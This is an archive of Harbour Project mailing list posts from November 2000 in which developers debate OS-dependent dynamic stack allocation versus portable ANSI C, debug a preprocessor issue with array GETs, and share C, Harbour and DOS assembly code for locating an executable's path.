Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas  <ron@profit-master.com>
In-Reply-To: <3A1FCECF.2573.7956C11@localhost>
Message-ID: <LOBBKAFMMFGJIKLMEPAKCEIADHAA.ron@profit-master.com>

Phil,

This will not cause any core dependencies!!!

You should think of it as exploration of O/S benefits instead.

This will *not* change anyone's ability to allocate large enough Stack for
his/her needs, on any O/S.

This simply means we can [quickly] provided *extended* functionality
(Dynamic Growth) on those O/S where it is possible (without reinventing the
wheel).

Please note that any O/S on which Harbour known to work, belongs to 1 of 2
camps, finite memory pool (only DOS) or [practically] infinite memory pool
(Win32, *X, O/S2).

Apparently all O/Ss with [practically] infinite memory pool, offer the
address reservation service. OTOH, all O/S with finite memory pool are
subject to related restrictions as is (outside of this issue).

There is no justification to not rely on such O/S service, in the name of
openness. This is nothing more than pure theoretical extremist view.

I don't believe it has any practical significance.

Ron

> > John,
> >
> > Don't let him drug you into his famous games.
> >
> > He will do nothing more than drain your energy, and take, any and all
> > time you could have devoted for more productive tasks.
> >
> > Same advise saved lots of my time.
> >
> > Let's research the *x Virtual Allocation Services, and offer a working
> > solution to our Stack problem.
>
> The only problem I have with this is that you are now creating core
> dependencies that are OS specific. This is something that we have
> avoided so far.
>
> Are you implying that we can't create a VM Block allocation
> scheme in ANSI C?
>
> Sometime in the future, people will want to port Harbour to other
> platforms. The more work we do in ANSI C, the more likely this will
> happen. This is to give long life to Harbour, not to stop productivity
> this month. It's a long term benefit.
>
> There is no deadline for Harbour. If you are creating one in your
> mind, then it is your deadline, not ours.
>
> I understand the desire to 'finish' version 1.0 of Harbour. There's
> nothing I'd like better, but I don't want to do it at the cost of future
> portability issues. We agreed long ago that the core of Harbour
> Project would be written in ANSI C. I propose we continue down
> this road.
>
> --
>               Phil Barnett  mailto:midnight@the-oasis.net
>                        WWW  http://www.the-oasis.net/
>                   FTP Site  ftp://ftp.the-oasis.net


From harbour@lists.harbour-project.org  Sat Nov 25 15:28:02 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Sat Nov 25 15:28:02 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas  <ron@profit-master.com>
In-Reply-To: <3A1FCECF.2573.7956C11@localhost>
Message-ID: <LOBBKAFMMFGJIKLMEPAKMEIADHAA.ron@profit-master.com>

Phil,

> There is no deadline for Harbour. If you are creating one in your
> mind, then it is your deadline, not ours.

Implementing Dynamic Stack by relying on a simple, single Address
Reservation Allocation, takes nothing away from anyone's ability to
implement Dynamic Stack, any other way, at any later time!

The beauty of this idea is exactly that it requires absolutely *no* change
in the current logic! IOW, this will *not* make it even slightly more
difficult to implement, if and when your concern becomes a practical issue.

I though you claimed we need to prioritize our efforts, by not adding any
unneeded features, until we have al Clipper base functionality covered.
Clipper does *not* have a dynamic stack.

Ron


From harbour@lists.harbour-project.org  Sat Nov 25 15:57:02 2000
From: harbour@lists.harbour-project.org (Patrick Mast, Harbour)
Date: Sat Nov 25 15:57:02 2000
Subject: [Harbour] New Harbour Version
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKMEIADHAA.ron@profit-master.com>
Message-ID: <NCBBJKNMIDPJNLJCHCHIGEJAFJAA.harbour@winfakt.com>

Captains,

The official version 0.35 is more than 3 months old now.
Isn't it time to release 0.36?

What do we miss for version 0.36?
Will we need to wait for the RDD for 0.36?

regards,

Patrick Mast
www.Patrick.Be.kz


From harbour@lists.harbour-project.org  Sat Nov 25 16:17:02 2000
From: harbour@lists.harbour-project.org (Brian Hays)
Date: Sat Nov 25 16:17:02 2000
Subject: [Harbour] pp on arrays
Message-ID: <000901c05724$f15829e0$8604d2cc@san.rr.com>

Ron:
We still have a pp problem with GETs on arrays, at least when using FWH
headers.
Notice the bSETGET() pseudo-function in the GET directive. This is actually
a #define.
For some reason, the pp doesn't expand it under these conditions and I get a
Undefined External bSETGET.
The same directive works fine on simple variables.

#define bSETGET(x) { | u | If( PCount()==0, x, x:= u ) }

#xcommand REDEFINE GET [ <oGet> VAR ] <uVar> ;
             [ ID <nId> ] ;
             [ <dlg: OF, WINDOW, DIALOG> <oDlg> ] ;
             [ <help:HELPID, HELP ID> <nHelpId> ] ;
             [ VALID   <ValidFunc> ]       ;
             [ PICTURE <cPict> ] ;
             [ <color:COLOR,COLORS> <nClrFore> [,<nClrBack>] ] ;
             [ FONT <oFont> ] ;
             [ CURSOR <oCursor> ] ;
             [ MESSAGE <cMsg> ] ;
             [ <update: UPDATE> ] ;
             [ WHEN <uWhen> ] ;
             [ ON CHANGE <uChange> ] ;
             [ <readonly: READONLY, NO MODIFY> ] ;
             [ <spin: SPINNER> [ON UP <SpnUp>] [ON DOWN <SpnDn>] [MIN <Min>]
[MAX <Max>] ] ;
       => ;
          [ <oGet> := ] TGet():ReDefine( <nId>, bSETGET(<uVar>), <oDlg>,;
             <nHelpId>, <cPict>, <{ValidFunc}>, <nClrFore>, <nClrBack>,;
             <oFont>, <oCursor>, <cMsg>, <.update.>, <{uWhen}>,;
             [ \{|nKey,nFlags,Self| <uChange> \}], <.readonly.>,;
             <.spin.>, <{SpnUp}>, <{SpnDn}>, <{Min}>, <{Max}>)


My Source:
      REDEFINE GET oInc VAR aCAL[ALARM_LEADTIME] ;
         id 1003  OF oFld:adialogs[1] ;
         PICTURE '999' ;
         VALID (if(aCAL[ALARM_LEADTIME] < 1, ErrBeep([Please enter a
positive number.]), .t.)) ;
         MESSAGE "Number of minutes before Appointments to sound the alarm"
UPDATE


Brian Hays
Abacus Data Systems, Inc



From harbour@lists.harbour-project.org  Sat Nov 25 16:32:02 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Sat Nov 25 16:32:02 2000
Subject: [Harbour] pp on arrays
In-Reply-To: <000901c05724$f15829e0$8604d2cc@san.rr.com>
Message-ID: <LOBBKAFMMFGJIKLMEPAKKEICDHAA.ron@profit-master.com>

Brian,

Your sample works perfect here! Here is my test:

// --------- test.prg ---------//
#define bSETGET(x) { | u | If( PCount()==0, x, x:= u ) }

#xcommand REDEFINE GET [ <oGet> VAR ] <uVar> ;
             [ ID <nId> ] ;
             [ <dlg: OF, WINDOW, DIALOG> <oDlg> ] ;
             [ <help:HELPID, HELP ID> <nHelpId> ] ;
             [ VALID   <ValidFunc> ]       ;
             [ PICTURE <cPict> ] ;
             [ <color:COLOR,COLORS> <nClrFore> [,<nClrBack>] ] ;
             [ FONT <oFont> ] ;
             [ CURSOR <oCursor> ] ;
             [ MESSAGE <cMsg> ] ;
             [ <update: UPDATE> ] ;
             [ WHEN <uWhen> ] ;
             [ ON CHANGE <uChange> ] ;
             [ <readonly: READONLY, NO MODIFY> ] ;
             [ <spin: SPINNER> [ON UP <SpnUp>] [ON DOWN <SpnDn>] [MIN
<Min>][MAX <Max>] ] ;
       => ;
          [ <oGet> := ] TGet():ReDefine( <nId>, bSETGET(<uVar>), <oDlg>,;
             <nHelpId>, <cPict>, <{ValidFunc}>, <nClrFore>, <nClrBack>,;
             <oFont>, <oCursor>, <cMsg>, <.update.>, <{uWhen}>,;
             [ \{|nKey,nFlags,Self| <uChange> \}], <.readonly.>,;
             <.spin.>, <{SpnUp}>, <{SpnDn}>, <{Min}>, <{Max}>)

Procedure Main( cValid )

      REDEFINE GET oInc VAR aCAL[ALARM_LEADTIME] ;
         id 1003  OF oFld:adialogs[1] ;
         PICTURE '999' ;
         VALID (if(aCAL[ALARM_LEADTIME] < 1, ErrBeep([Please enter apositive
number.]), .t.)) ;
         MESSAGE "Number of minutes before Appointments to sound the alarm"

RETURN
// --------- EOF test.prg ---------//

Here is the PPO output:

// --------- test.ppo ---------//
Procedure Main()





       oInc := TGet():ReDefine(1003,{ | u |
If(PCount()==0,aCAL[ALARM_LEADTIME],aCAL[ALARM_LEADTIME]:=
u ) },oFld:adialogs[1],,"999",{||(if(aCAL[ALARM_LEADTIME] <
1,ErrBeep("Please enter apositive number."),.t.))},,,,,"Number of minutes
before Appointments to sound the alarm",.F.,,,.F.,.F.,,,,)

return
// --------- EOF test.ppo ---------//

Ron


From harbour@lists.harbour-project.org  Sat Nov 25 16:37:01 2000
From: harbour@lists.harbour-project.org (Phil Barnett)
Date: Sat Nov 25 16:37:01 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas  <ron@profit-master.com>
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKCEIADHAA.ron@profit-master.com>
References: <3A1FCECF.2573.7956C11@localhost>
Message-ID: <3A1FEA9D.8839.8020BBF@localhost>

On 25 Nov 2000, at 12:16, Ron Pinkas wrote:

> Phil,
> 
> This will not cause any core dependencies!!!

Well, I don't know how you figure that.

When you call an operating system specific function from inside 
the VMM, that is a core dependency. There is no other way to look 
at it.

So far, we have avoided that, and I think for good reason.

The proper solution is to create the dynamic system that is 
identical in code for every system. Then it is under our control how 
it works. Today, it works in Windows, but will it next year? History 
has shown us that Microsoft loves to change the rules as it goes. 
We should depend on them as little as possible.

The memory management we seek can be created equally for all 
operating systems without resorting to operating system 
dependent behaviour.

I'm surprised that anyone being beat up by Microsoft Operating 
System changes for years would suggest that we depend on a 
feature that we can and should be implementing ourselves.

So, unless I hear a consensus that we leave ANSI C for our core 
compiler capabilities then I say it is something we should not be 
doing.

If we want to depend on outside influences, then why not just use 
Python. It's already done.


-- 
              Phil Barnett  mailto:midnight@the-oasis.net
                       WWW  http://www.the-oasis.net/
                  FTP Site  ftp://ftp.the-oasis.net

From harbour@lists.harbour-project.org  Sat Nov 25 16:37:34 2000
From: harbour@lists.harbour-project.org (Phil Barnett)
Date: Sat Nov 25 16:37:34 2000
Subject: [Harbour] New Harbour Version
In-Reply-To: <NCBBJKNMIDPJNLJCHCHIGEJAFJAA.harbour@winfakt.com>
References: <LOBBKAFMMFGJIKLMEPAKMEIADHAA.ron@profit-master.com>
Message-ID: <3A1FEA9D.16315.8020BE7@localhost>

On 25 Nov 2000, at 21:56, Patrick Mast, Harbour wrote:

> Captains,
> 
> The official version 0.35 is more than 3 months old now.
> Isn't it time to release 0.36?
> 
> What do we miss for version 0.36?
> Will we need to wait for the RDD for 0.36?

That's what I've been waiting for before calling for a new release.


-- 
              Phil Barnett  mailto:midnight@the-oasis.net
                       WWW  http://www.the-oasis.net/
                  FTP Site  ftp://ftp.the-oasis.net

From harbour@lists.harbour-project.org  Sat Nov 25 17:16:02 2000
From: harbour@lists.harbour-project.org (Dave Pearson)
Date: Sat Nov 25 17:16:02 2000
Subject: Changes in VM and eval stack (was:(Re: [Harbour] Random gpfs)
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKCEHKDHAA.ron@profit-master.com>; from ron@profit-master.com on Fri, Nov 24, 2000 at 08:05:51PM -0800
References: <01a001c05690$af2ee7a0$0a0ac8c8@VECWS1> <LOBBKAFMMFGJIKLMEPAKCEHKDHAA.ron@profit-master.com>
Message-ID: <20001125194234.H26952@hagbard.davep.org>

On Fri, Nov 24, 2000 at 08:05:51PM -0800, Ron Pinkas wrote:

> 3. I don't believe in reinventing the wheel, especially, not under sever
> time constraints. I want to see 1.0 ASAP. I am not in favor of
> re-implementing such critical piece (unless un-avoidable) before we release
> 1.0.

What severe time constraints are being imposed on harbour and who is
imposing them?

-- 
The Harbour Project: A free software Clipper compatible compiler
Home Page..........: http://www.harbour-project.org/
FAQ................: http://www.harbour-project.org/faq/harbour.html
My harbour page....: http://www.hagbard.demon.co.uk/harbour/

From harbour@lists.harbour-project.org  Sat Nov 25 18:38:03 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Sat Nov 25 18:38:03 2000
Subject: Changes in VM and eval stack (was:(Re: [Harbour] Random gpfs)
In-Reply-To: <20001125194234.H26952@hagbard.davep.org>
Message-ID: <LOBBKAFMMFGJIKLMEPAKOEIDDHAA.ron@profit-master.com>

> On Fri, Nov 24, 2000 at 08:05:51PM -0800, Ron Pinkas wrote:
>
> > 3. I don't believe in reinventing the wheel, especially, not under sever
> > time constraints. I want to see 1.0 ASAP. I am not in favor of
> > re-implementing such critical piece (unless un-avoidable)
> before we release
> > 1.0.
>
> What severe time constraints are being imposed on harbour and who is
> imposing them?

None! Thank you for clearing this up, I simply forgot.

I will soon append my will with detailed instructions for my boys Tom (8)
and Dean (5.5), on how to download and build Harbour incase we are not done
in my life time.

Maybe Alaska's CEO was conservative in his time estimates, after all, we do
have eternity to complete this project.

Ron


From harbour@lists.harbour-project.org  Sat Nov 25 19:37:02 2000
From: harbour@lists.harbour-project.org (Luiz Rafael Culik Guimaraes)
Date: Sat Nov 25 19:37:02 2000
Subject: [Harbour] Harbour make Utility
Message-ID: <000b01c05740$e9b8cde0$0100007f@sl.conex.net>

Dear Friends

I´m creating the hbmake utility , so harbour will have it own make program
compatible with Bcc and Gnu C.
I´ve set the follow options
    -P print all envars
    -Dsymbol[=string] define symbol [ equal to string]
    -e  create an new makefile

The Bcc support for hbmake is nearly ready. I need an example of gcc link
file and also the name of gcc link utility.

The default extension will be .mak (but i´m thinking to use .hrm

Comments.

Regards from Brazil

Luiz Rafael Culik

Ps: is it possible to anyone write an functions that return the path of
where the executable is located.
Exemple. i have hbmake.exe in \harb\bin , but i has make the call to it from
\video. the return value should be \harb\bin



From harbour@lists.harbour-project.org  Sat Nov 25 19:43:02 2000
From: harbour@lists.harbour-project.org (Luiz Rafael Culik Guimaraes)
Date: Sat Nov 25 19:43:02 2000
Subject: [Harbour] New Harbour Version
References: <NCBBJKNMIDPJNLJCHCHIGEJAFJAA.harbour@winfakt.com>
Message-ID: <002b01c05741$cd4955c0$0100007f@sl.conex.net>

Patrick

> Isn't it time to release 0.36?
> 
> What do we miss for version 0.36?
Can you wait a few days so I can finish hbmake

Regards

Luiz Rafael Culik



From harbour@lists.harbour-project.org  Sat Nov 25 19:44:04 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Sat Nov 25 19:44:04 2000
Subject: [Harbour] Harbour make Utility
In-Reply-To: <000b01c05740$e9b8cde0$0100007f@sl.conex.net>
Message-ID: <LOBBKAFMMFGJIKLMEPAKAEIFDHAA.ron@profit-master.com>

Luiz,

Great!

You can get the executable path, by looking at the command line argument.

What language, C or Harbour?

Ron

> Dear Friends
>
> I´m creating the hbmake utility , so harbour will have it own make program
> compatible with Bcc and Gnu C.
> I´ve set the follow options
>     -P print all envars
>     -Dsymbol[=string] define symbol [ equal to string]
>     -e  create an new makefile
>
> The Bcc support for hbmake is nearly ready. I need an example of gcc link
> file and also the name of gcc link utility.
>
> The default extension will be .mak (but i´m thinking to use .hrm
>
> Comments.
>
> Regards from Brazil
>
> Luiz Rafael Culik
>
> Ps: is it possible to anyone write an functions that return the path of
> where the executable is located.
> Exemple. i have hbmake.exe in \harb\bin , but i has make the call
> to it from
> \video. the return value should be \harb\bin


From harbour@lists.harbour-project.org  Sat Nov 25 20:34:02 2000
From: harbour@lists.harbour-project.org (Luiz Rafael Culik Guimaraes)
Date: Sat Nov 25 20:34:02 2000
Subject: [Harbour] Harbour make Utility
References: <LOBBKAFMMFGJIKLMEPAKAEIFDHAA.ron@profit-master.com>
Message-ID: <000701c05748$f2a90980$0100007f@sl.conex.net>

Ron

> Luiz,
>
> Great!
Sure. it fully written in Harbour
> You can get the executable path, by looking at the command line argument.
Can you
> What language, C or Harbour?
Can you give an example in both language.
I need to know the exact dir that hbmake is located to set the neccessary
macros for the location of harbour include files and libraries

Regards

Luiz Rafael Culik



From harbour@lists.harbour-project.org  Sat Nov 25 21:44:02 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Sat Nov 25 21:44:02 2000
Subject: [Harbour] Harbour make Utility
In-Reply-To: <000701c05748$f2a90980$0100007f@sl.conex.net>
Message-ID: <LOBBKAFMMFGJIKLMEPAKGEIGDHAA.ron@profit-master.com>

Luiz,

In C you can use argv[0] (2nd argument of the main function)

This will give you the 1st argument of the command line like follows:

   hbmake foo              // argv[0] = "hbmake"
   \harbour\bin\hbmake foo // argv[0] = "\harbour\bin\hbmake"

Please note that if argv = "hbmake" or "hbmake.exe" *without* any path, you
have to check for its existence in the current directory explicitly, because
it may NOT exist in current directory, and was found in the path.

I don't think there is any standard ANSI C way to find if file exist, read
source/rtl/filesys.c and look for: [BOOL hb_fsFile( BYTE * pFilename )] to
learn how to check for file existence.

If hbmake.exe does NOT exist in current directory, then you have to scan the
PATH statement (DOS & WIN getenv("PATH") - don't know in *X). You will have
to check each directory listed in PATH in order, until you find hbmake.exe.

This is only needed if argv[0] does *NOT* list the path!!!

In Harbour you will do the same, but you'll need a way to access argv. So,
you will need an HB_FUNC wrapper to hb_cmdargARGV()

Something like this:

   HB_FUNC( HB_EXENAME )
   {
      char ** argv = hb_cmdargARGV();
      hb_retc( argv[0] );
   }

Then in Harbour:

   Function Find_HBMAKE()

      LOCAL cEXE := HB_EXENAME(), cPath

      IF Upper( cEXE ) == "HBMAKE" // local dir we must check if exists.
         IF File( "HBMAKE.EXE" )
            ? "hbmake is in current dir"
            cPath := "."
         ELSE
            cPath := GetEnv( "PATH" )
            /* We must parse and search each directory ...*/
         ENDIF

   RETURN cPath

Hope this helps,

Ron

> Ron
>
> > Luiz,
> >
> > Great!
> Sure. it fully written in Harbour
> > You can get the executable path, by looking at the command line
> argument.
> Can you
> > What language, C or Harbour?
> Can you give an example in both language.
> I need to know the exact dir that hbmake is located to set the neccessary
> macros for the location of harbour include files and libraries
>
> Regards
>
> Luiz Rafael Culik


From harbour@lists.harbour-project.org  Sat Nov 25 21:51:02 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Sat Nov 25 21:51:02 2000
Subject: [Harbour] Harbour make Utility
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKGEIGDHAA.ron@profit-master.com>
Message-ID: <LOBBKAFMMFGJIKLMEPAKMEIGDHAA.ron@profit-master.com>

> This is only needed if argv[0] does *NOT* list the path!!!

and hbmake.exe is NOT in current directory!!!


From harbour@lists.harbour-project.org  Sat Nov 25 22:48:01 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Sat Nov 25 22:48:01 2000
Subject: [Harbour] Harbour make Utility
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKMEIGDHAA.ron@profit-master.com>
Message-ID: <LOBBKAFMMFGJIKLMEPAKGEIHDHAA.ron@profit-master.com>

Luiz,

Also each respective O/S usually has such function.

Here I found old ASM (Clipper Extend) source I wrote long ago to do it in
dos:

;---------------------------------------------------------------------------
-
; ProgName()
ProgName PROC FAR

;Save important registers
push ds
push es
push si
push di

; Get psp segment
mov     ah, 51h
int     21h

; Result in bx
mov     es,bx

mov     es, es:[2ch]
xor     di, di
xor     al, al
mov     cx, -1
cld

; skip command trail
SkipLoop:   repne scasb
            scasb
            jne SkipLoop
            add di, 2
            mov bx, di
            mov cx, -1
            repne scasb
            not cx
            dec cx
            mov ax,cx

; len of string
push    ax

; segment addres
push    es

; offset address
push    bx

call    __retclen

; Reseting stack pointer
add     sp, 6

pop     di
pop     si
pop     es
pop     ds

ret

ProgName ENDP
;---------------------------------------------------------------------------
-

Ron


From harbour@lists.harbour-project.org  Sun Nov 26 00:38:02 2000
From: harbour@lists.harbour-project.org (Brian Hays)
Date: Sun Nov 26 00:38:02 2000
Subject: [Harbour] pp on arrays
References: <LOBBKAFMMFGJIKLMEPAKKEICDHAA.ron@profit-master.com>
Message-ID: <002301c0576a$d5c8f240$8604d2cc@san.rr.com>

Aaargh!
Sorry, if I take the time to whittle it down I really should test exactly
what I've whittled before sending it up.
There was another header involved, and the single line that makes the
difference is a compound subscript for the array element:

#define ALARM_LEADTIME        14,1
Apparently the embedded comma causes a problem.

Brian Hays
Abacus Data Systems, Inc

----- Original Message -----
From: "Ron Pinkas" <ron@profit-master.com>
To: <harbour@lists.harbour-project.org>
Sent: Saturday, November 25, 2000 1:33 pm
Subject: RE: [Harbour] pp on arrays


> Brian,
>
> Your sample works perfect here! Here is my test:
>
> // --------- test.prg ---------//
> #define bSETGET(x) { | u | If( PCount()==0, x, x:= u ) }
>
> #xcommand REDEFINE GET [ <oGet> VAR ] <uVar> ;
>              [ ID <nId> ] ;
>              [ <dlg: OF, WINDOW, DIALOG> <oDlg> ] ;
>              [ <help:HELPID, HELP ID> <nHelpId> ] ;
>              [ VALID   <ValidFunc> ]       ;
>              [ PICTURE <cPict> ] ;
>              [ <color:COLOR,COLORS> <nClrFore> [,<nClrBack>] ] ;
>              [ FONT <oFont> ] ;
>              [ CURSOR <oCursor> ] ;
>              [ MESSAGE <cMsg> ] ;
>              [ <update: UPDATE> ] ;
>              [ WHEN <uWhen> ] ;
>              [ ON CHANGE <uChange> ] ;
>              [ <readonly: READONLY, NO MODIFY> ] ;
>              [ <spin: SPINNER> [ON UP <SpnUp>] [ON DOWN <SpnDn>] [MIN
> <Min>][MAX <Max>] ] ;
>        => ;
>           [ <oGet> := ] TGet():ReDefine( <nId>, bSETGET(<uVar>), <oDlg>,;
>              <nHelpId>, <cPict>, <{ValidFunc}>, <nClrFore>, <nClrBack>,;
>              <oFont>, <oCursor>, <cMsg>, <.update.>, <{uWhen}>,;
>              [ \{|nKey,nFlags,Self| <uChange> \}], <.readonly.>,;
>              <.spin.>, <{SpnUp}>, <{SpnDn}>, <{Min}>, <{Max}>)
>
> Procedure Main( cValid )
>
>       REDEFINE GET oInc VAR aCAL[ALARM_LEADTIME] ;
>          id 1003  OF oFld:adialogs[1] ;
>          PICTURE '999' ;
>          VALID (if(aCAL[ALARM_LEADTIME] < 1, ErrBeep([Please enter
apositive
> number.]), .t.)) ;
>          MESSAGE "Number of minutes before Appointments to sound the
alarm"
>
> RETURN
> // --------- EOF test.prg ---------//
>
> Here is the PPO output:
>
> // --------- test.ppo ---------//
> Procedure Main()
>
>
>
>
>
>        oInc := TGet():ReDefine(1003,{ | u |
> If(PCount()==0,aCAL[ALARM_LEADTIME],aCAL[ALARM_LEADTIME]:=
> u ) },oFld:adialogs[1],,"999",{||(if(aCAL[ALARM_LEADTIME] <
> 1,ErrBeep("Please enter apositive number."),.t.))},,,,,"Number of minutes
> before Appointments to sound the alarm",.F.,,,.F.,.F.,,,,)
>
> return
> // --------- EOF test.ppo ---------//
>
> Ron
>
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
>
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org
>


From harbour@lists.harbour-project.org  Sun Nov 26 01:11:02 2000
From: harbour@lists.harbour-project.org (April)
Date: Sun Nov 26 01:11:02 2000
Subject: [Harbour] using djgpp with rsxntdj
Message-ID: <3A20A99C.EA327259@user.rose.com>

the batch file bin\bld.bat echos (abbreviated):

   echo     HB_COMPILER:
   echo       - When HB_ARCHITECTURE=dos
   echo         - djgpp   (Delorie GNU C, DOS 32-bit)
   echo         - rxs32   (EMX/RSXNT/DOS GNU C, DOS 32-bit)
   echo       - When HB_ARCHITECTURE=w32
   echo         - gcc     (Cygnus/Cygwin GNU C, Windows 32-bit)
   echo         - rxsnt   (EMX/RSXNT/Win32 GNU C, Windows 32-bit)

and the doc\whatsnew.txt states (abbreviated):
    Version 0.34 Build 34 (2000-06-02)
    - RSX32 and RSXNT compiler support


Is this for use with the rsxntdj addon to djgpp?  If so, can someone who
uses it
talk to me about it?  If it isn't, is there any burning desire to make
it so?

I really suspect that it is not as I suspect because:
I changed my compiler & architecture as needed for dos\rxs32:

    - libs were created without the prefix 'lib'
    - the pipe command at the end of 'ar  r pp.a ... || del pp.a' caused

        "No command name seen."
    - it uses an undeclared function _int86() [there is int86() though]



From harbour@lists.harbour-project.org  Sun Nov 26 11:25:03 2000
From: harbour@lists.harbour-project.org (Brian Hays)
Date: Sun Nov 26 11:25:03 2000
Subject: [Harbour] doubly-detached locals
Message-ID: <001001c0577f$6c2c7590$8604d2cc@san.rr.com>

I have some clipper code that I had to change to get to work right in
Harbour.
Basically, it seems that in Harbour a codeblock defined in a LOCAL statement
can only reference locals already declared above it.
In Clipper, the referenced variables could successfully be declared in a
following LOCAL declaration.

The code is one of those ugly children of evolution. I only offer it with
hopes of illuminating the issue and reminding us of the kind of messes
Clipper could actually compile.
Below is the original code, with OrgiDlg declared after bRefresh, which
references OrgiDlg.
Notice bRefresh is included in the "ON INIT"  codeblock that is eventually
eval'ed after the dialog is built.  When bRefresh is eval'ed, an error
occurs saying OrgiDlg doesn't exist.  If I reverse the two, it works fine.
I'm not even going to recommend anyone fix this, but if we want to be 101%
compatible....

local bRefresh := {|| if(OrgiDlg:lEnding, .t., ;
         (OrgiDlg:update(),  ;
         aDTBrowses[nBrowse]:setfocus(), ;

Events->(dbGoTo(aDTBrowses[nBrowse]:aArray[aDTBrowses[nBrowse]:nAt,2])))) }

LOCAL OrgiDlg

ACTIVATE DIALOG OrgiDlg ;
   on init (CursorWait(), dbselectArea(2),;
         eval(bRefresh), Self:move(0,1), if(!empty(cstr),;

(osplit:SetPosition(val(strToken(cStr,1,","))),osplit1:SetPosition(val(strTo
ken(cStr,2,","))),;
         osplit2:SetPosition(val(strToken(cStr,3,","))) ),));
   nowait

Brian Hays
Abacus Data Systems, Inc



From harbour@lists.harbour-project.org  Sun Nov 26 11:25:36 2000
From: harbour@lists.harbour-project.org (Luiz Rafael Culik Guimaraes)
Date: Sun Nov 26 11:25:36 2000
Subject: [Harbour] Harbour make Utility
References: <LOBBKAFMMFGJIKLMEPAKGEIGDHAA.ron@profit-master.com>
Message-ID: <001301c05782$c86374a0$0100007f@sl.conex.net>

Ron



>
> Please note that if argv = "hbmake" or "hbmake.exe" *without* any path,
you
> have to check for its existence in the current directory explicitly,
because
> it may NOT exist in current directory, and was found in the path.
>
> I don't think there is any standard ANSI C way to find if file exist, read
> source/rtl/filesys.c and look for: [BOOL hb_fsFile( BYTE * pFilename )] to
> learn how to check for file existence.

> If hbmake.exe does NOT exist in current directory, then you have to scan
the
> PATH statement (DOS & WIN getenv("PATH") - don't know in *X). You will
have
> to check each directory listed in PATH in order, until you find
hbmake.exe.
*
> This is only needed if argv[0] does *NOT* list the path!!!
>
> In Harbour you will do the same, but you'll need a way to access argv. So,
> you will need an HB_FUNC wrapper to hb_cmdargARGV()
>
> Something like this:
>
>    HB_FUNC( HB_EXENAME )
>    {
>       char ** argv = hb_cmdargARGV();
>       hb_retc( argv[0] );
>    }
>
> Then in Harbour:
>
>    Function Find_HBMAKE()
>
>       LOCAL cEXE := HB_EXENAME(), cPath
>
>       IF Upper( cEXE ) == "HBMAKE" // local dir we must check if exists.
>          IF File( "HBMAKE.EXE" )
>             ? "hbmake is in current dir"
>             cPath := "."
>          ELSE
>             cPath := GetEnv( "PATH" )
>             /* We must parse and search each directory ...*/
>          ENDIF
>
>    RETURN cPath
>
> Hope this helps,

This sugestion is good.

I´ll try it

Regards

Luiz Rafael Culik



From harbour@lists.harbour-project.org  Sun Nov 26 11:26:10 2000
From: harbour@lists.harbour-project.org (Patrick Mast, Harbour)
Date: Sun Nov 26 11:26:10 2000
Subject: [Harbour] New Harbour Version
In-Reply-To: <3A1FEA9D.16315.8020BE7@localhost>
Message-ID: <NCBBJKNMIDPJNLJCHCHIOEJGFJAA.harbour@winfakt.com>

Phil,

> > The official version 0.35 is more than 3 months old now.
> > Isn't it time to release 0.36?
> > What do we miss for version 0.36?
> > Will we need to wait for the RDD for 0.36?
> That's what I've been waiting for before calling for a new release.
Ok for me.

regards,

Patrick Mast
www.Patrick.Be.kz


From harbour@lists.harbour-project.org  Sun Nov 26 11:26:44 2000
From: harbour@lists.harbour-project.org (Ryszard Glab)
Date: Sun Nov 26 11:26:44 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas  <ron@profit-master.com>
In-Reply-To: <200011250818_MC2-BC1B-614@compuserve.com>
Message-ID: <3A21178A.24618.948B04D@localhost>

On 25 Nov 2000, at 8:18, John Skelton wrote:

> Please can you stop talking about "idle" tasks which are clearly
> nothing of the sort!
> 
> If you want periodic, low-ish priority tasks (as it appears you do),
> say so and let's implement them explicitly as that.

  OK. This was the state of idle code before Ron's changes. Until Ron 
decided that he knows better what is the real idle state usage and 
now is developing a theory to support his changes. 
  It is not a personal conflict. We are developing a compiler. A 
compiler should give the maximum of freedom in code developing for 
future user instead of forcing unneeded requirements. This is not the 
first example when Ron is forcing some limitations to this freedom 
for no reasons. So this is a discussion about our method of harbour 
developing. Ron is again developing some complex solution and 
dependencies where a very simple solution already existed. 

> It would make more sense to have such things be guaranteed (or some
> such) to run, rather than the somewhat ugly kludge needed with
> Clipper.
> 
> Maybe the pcode could run such a task once every N function calls,
> message sends, loops, or some such.  The exact details need some
> thought, but let's do it right.

  Yes. However I would call it 'events' and I would prefer to 
introduce a different kinds of events managed by the VM. This is 
however a different usage that is not related to idle states.

Regards, Ryszard

From harbour@lists.harbour-project.org  Sun Nov 26 11:27:20 2000
From: harbour@lists.harbour-project.org (Ryszard Glab)
Date: Sun Nov 26 11:27:20 2000
Subject: Changes in VM and eval stack (was:(Re: [Harbour] Random   gpfs)
In-Reply-To: <200011241846_MC2-BC02-9EE3@compuserve.com>
Message-ID: <3A210EE9.26120.926F941@localhost>

On 24 Nov 2000, at 18:46, John Skelton wrote:

> "We will have to handle block crossing no mater how big a block will
> be"
> 
> I said so.

  Then simple (hb_stack.pPos - 1) will not work. It must be replaced 
with something that is aware of blocks.

> I suggested making sure before calling each function that there is
> plenty of room.  If not, allocate another (large) block.
> 
> The underlying idea is to rarely allocate (or free) blocks, and to
> have all the params & locals for a function be in only _one_ block.
> The exact details of getting that to occur need arranging, but surely
> the concept is simple.  If implemented, it would mean almost all
> functions would need no change from the code they have now, despite
> this new more-capable stack.

  The problem is: how to determine if there is plenty of room? We can 
change the generated pcode to know the number of parameters and local 
